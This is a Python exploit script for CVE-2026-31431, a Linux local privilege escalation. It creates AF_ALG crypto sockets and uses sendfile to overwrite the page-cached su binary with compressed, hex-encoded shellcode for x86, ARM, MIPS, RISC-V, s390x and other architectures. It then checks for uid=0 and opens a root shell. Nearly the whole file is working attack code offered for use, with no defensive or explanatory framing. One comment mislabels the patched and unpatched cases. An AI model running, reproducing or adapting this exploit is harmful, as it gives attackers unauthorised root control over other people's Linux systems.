#!/usr/bin/env python3
"""
CVE-2026-31431 Exploit - AF_ALG + splice page-cache overwrite (LPE)
"""

import os
import zlib
import socket
import logging
import sys
import platform
import subprocess
from typing import Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def hex_to_bytes(hex_string: str) -> bytes:
    """Convert hex string to bytes."""
    return bytes.fromhex(hex_string)

def get_architecture_payload() -> str:
    """Get the appropriate payload for the current architecture."""
    machine = platform.machine()
    logger.info(f"Detected architecture: {machine}")

    arm_payload    = "789cab77f57163646464800126060d0610af02489ac04519584d18141860aa10aa19c1780d90046156909000035140bc60c16306061066782fc1d0ff884100c85658f098bb002206926384b2f59332f3f48b33180023be16fc"
    x86_payload    = "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b81cc80461569098000383e1ed0de2671b0c0f0464e8eb176764e82765e6753e363c697869033750f8f606c6b30d00a9571532"
    mips64_payload = "789cab77f57163626464800126060e0610af82c101cc77604005ec0c0c0d0e0c160c301d209a154585030abd05ca83d10c0210eabd30930a0f58bf200b88afaaf0805985a1454551838141d18081e120545e518181e11094ad9f9499a75f9cc100009ffe0df4"
    loong_payload  = "789cab77f571636264648001260608af82c101cc7760c0040e0c160c301d209a154d1699de00e5c168060108c5c2708089dbe3101303833690cd20d5b2e010132b508c0d245e72182a0e621f04b3f59332f3f48b331800935f1079"

    payloads = {
        "x86_64":     "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3",
        "aarch64":    "789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca83d10c023046c3250fa1864b40fd578086083002f94c40bc421a2a06627343d8fa499979fac5190c00436c1587",
        "riscv64":    "789cab77f5716362646480012686cf0c205e05830398efc080091c182c18603a40342b9a2c32bd01ca83d10c02106a328702a730506331902d0ea485595d992683683690dc055e9038481ec86605b1f59332f3f48b331800b6680e8b",
        "ppc64le":    "789cab77f5716362646480012606510610af82c101cc776040054c60310b06980e10cd8aa2c20185de00e5c16806010825ce00348421c102689e8b034382cd0a86e404068606a0d8020b6ea01c481c24cf0865eb2765e6e91767300000528e0df2",
        "armv5l":     arm_payload,
        "armv6l":     arm_payload,
        "armv7l":     arm_payload,
        "i386":       x86_payload,
        "i486":       x86_payload,
        "i586":       x86_payload,
        "i686":       x86_payload,
        "mips64":     mips64_payload,
        "mips64el":   mips64_payload,
        "loong64":    loong_payload,
        "loongarch64":loong_payload,
        "s390x":      "789cab77f5716362626480032606312009117060a8808a3a30200307060b068416108b154d1e5dd706545a8061b924c3d5e59a0c0c5c0ccb35ffcf39600014145ceec9c0b03c12883381589231890ba48a11a24a3f29334fbf38830100070212f1",
    }

    if machine in payloads:
        return payloads[machine]

    logger.warning(f"No specific payload for {machine}, using default x86_64 payload")
    return payloads["x86_64"]

def check_dependencies() -> bool:
    """Check if required dependencies are available."""
    try:
        # Check if AF_ALG is supported
        sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
        sock.close()

        # Check if su binary exists
        su_path = find_su_binary()
        if not os.path.exists(su_path):
            logger.error(f"su binary not found at {su_path}")
            return False

        return True
    except Exception as e:
        logger.error(f"Dependency check failed: {e}")
        return False

def setup_alg_socket() -> socket.socket:
    """Create and configure AF_ALG socket for crypto operations."""
    try:
        sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
        sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))

        # Configure socket options, endianness-aware
        SOL_ALG = 279
        key_prefix = '00080001' if sys.byteorder == 'big' else '08000100'
        sock.setsockopt(SOL_ALG, 1, hex_to_bytes(key_prefix + '0' * 6 + '1' + '0' * 65))
        sock.setsockopt(SOL_ALG, 5, None, 4)

        return sock
    except Exception as e:
        logger.error(f"Failed to setup AF_ALG socket: {e}")
        raise

def send_crypto_data(sock: socket.socket, file_fd: int, offset: int, data: bytes) -> None:
    """Send crypto data through ALG socket using sendfile."""
    try:
        conn, _ = sock.accept()
        total_len = offset + 4
        zero_byte = b'\x00'

        # Send message with crypto data, endianness-aware
        conn.sendmsg(
            [b"A" * 4 + data],
            [
                (279, 3, zero_byte * 4),
                (279, 2, (16).to_bytes(4, sys.byteorder) + zero_byte * 16),
                (279, 4, (8).to_bytes(4, sys.byteorder)),
            ],
            32768
        )

        # Use sendfile to transfer data from file fd to socket
        try:
            os.sendfile(conn.fileno(), file_fd, 0, total_len)

            # Attempt to receive response
            try:
                conn.recv(8 + offset)
            except:
                pass
        finally:
            conn.close()
    except Exception as e:
        logger.error(f"Failed to send crypto data: {e}")
        raise

def find_su_binary() -> Optional[str]:
    """Locate the su binary path."""
    try:
        result = os.popen("command -v su").read().strip()
        return result or "/usr/bin/su"
    except:
        return "/usr/bin/su"

def log_exploit_failure(msg: str) -> None:
    """Log exploit failure and exit with status 1."""
    logger.error(f"Exploit failed - {msg}")
    sys.exit(1)

def main():
    """Main exploit function."""
    # Check dependencies first
    if not check_dependencies():
        logger.error("Dependency check failed. Exiting.")
        sys.exit(1)

    try:
        # Find su binary
        su_path = find_su_binary()
        logger.info(f"Using su binary: {su_path}")

        # Open su binary as raw file descriptor (required for sendfile)
        file_fd = os.open(su_path, os.O_RDONLY)
        try:
            # Get architecture-specific payload
            compressed_payload = get_architecture_payload()
            logger.debug(f"Using payload: {compressed_payload}")
            payload = zlib.decompress(hex_to_bytes(compressed_payload))

            # Set up ALG socket
            alg_socket = setup_alg_socket()

            # Send payload in chunks
            offset = 0
            while offset < len(payload):
                chunk = payload[offset:offset+4]
                send_crypto_data(alg_socket, file_fd, offset, chunk)
                offset += 4

            # Ensure socket is closed even on error
            try:
                # Test exploit by piping a command to su — avoids interactive password prompt
                # If patched: su runs the command as root, no password needed
                # If not patched: su waits for password and times out
                logger.info("Exploit payload sent, testing escalation...")
                test = subprocess.run(
                    ["su"],
                    input="id\nexit\n",
                    capture_output=True,
                    text=True,
                    timeout=3
                )
                if test.returncode == 0 and "uid=0" in test.stdout:
                    logger.info("Privilege escalation successful! Dropping into root shell...")
                    os.system("su")
                else:
                    log_exploit_failure("system may not be vulnerable to CVE-2026-31431")
            except subprocess.TimeoutExpired:
                log_exploit_failure("system may not be vulnerable to CVE-2026-31431")
            finally:
                alg_socket.close()
        finally:
            os.close(file_fd)

    except zlib.error as e:
        logger.error(f"Failed to decompress payload: {e}")
        log_exploit_failure("incorrect payload for your architecture")
    except PermissionError as e:
        log_exploit_failure(f"permission denied accessing kernel interfaces: {e}")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
